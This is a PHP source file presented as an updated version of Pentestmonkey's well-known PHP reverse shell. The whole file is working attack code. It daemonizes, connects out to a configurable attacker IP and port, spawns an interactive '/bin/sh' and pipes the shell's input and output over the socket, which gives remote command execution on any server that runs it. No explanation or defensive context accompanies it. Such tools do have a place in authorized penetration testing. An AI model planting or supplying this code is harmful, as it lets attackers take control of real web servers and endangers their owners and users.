# Updated version of the orginal Pentestmonkey's PHP Reverse Shell
<?php

set_time_limit(0);

$ip = '127.0.0.1';    // CHANGE THIS
$port = 1234;         // CHANGE THIS
$chunk_size = 1400;
$shell_cmd = '/bin/sh -i';
$daemon = false;
$debug = false;

// Daemonize if possible
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        log_msg("ERROR: Can't fork");
        exit(1);
    }
    if ($pid) {
        exit(0);
    }
    if (function_exists('posix_setsid') && posix_setsid() == -1) {
        log_msg("ERROR: Can't setsid()");
        exit(1);
    }
    $daemon = true;
} else {
    log_msg("WARNING: Daemonization failed. Continuing anyway.");
}

chdir('/');
umask(0);

// Open reverse connection
$sock = @fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    log_msg("ERROR: $errstr ($errno)");
    exit(1);
}

// Spawn shell process
$descriptors = [
    0 => ["pipe", "r"],
    1 => ["pipe", "w"],
    2 => ["pipe", "w"]
];
$process = @proc_open($shell_cmd, $descriptors, $pipes);

if (!is_resource($process)) {
    log_msg("ERROR: Can't spawn shell");
    fclose($sock);
    exit(1);
}

// Set non-blocking mode
stream_set_blocking($pipes[0], false);
stream_set_blocking($pipes[1], false);
stream_set_blocking($pipes[2], false);
stream_set_blocking($sock, false);

log_msg("Reverse shell connected to $ip:$port");

while (true) {
    if (feof($sock) || feof($pipes[1])) {
        log_msg("Connection closed");
        break;
    }

    $read = [$sock, $pipes[1], $pipes[2]];
    $num_changed = @stream_select($read, $write = null, $except = null, null);

    if ($num_changed === false) {
        break;
    }

    // Read from socket, send to shell
    if (in_array($sock, $read)) {
        $input = fread($sock, $chunk_size);
        if ($input === false) break;
        fwrite($pipes[0], $input);
    }

    // Read from shell stdout, send to socket
    if (in_array($pipes[1], $read)) {
        $output = fread($pipes[1], $chunk_size);
        if ($output === false) break;
        fwrite($sock, $output);
    }

    // Read from shell stderr, send to socket
    if (in_array($pipes[2], $read)) {
        $error = fread($pipes[2], $chunk_size);
        if ($error === false) break;
        fwrite($sock, $error);
    }
}

// Cleanup
foreach ($pipes as $pipe) {
    fclose($pipe);
}
fclose($sock);
proc_close($process);

// Logging function
function log_msg($msg) {
    global $daemon;
    if (!$daemon) {
        echo "$msg\n";
    }
}

?>
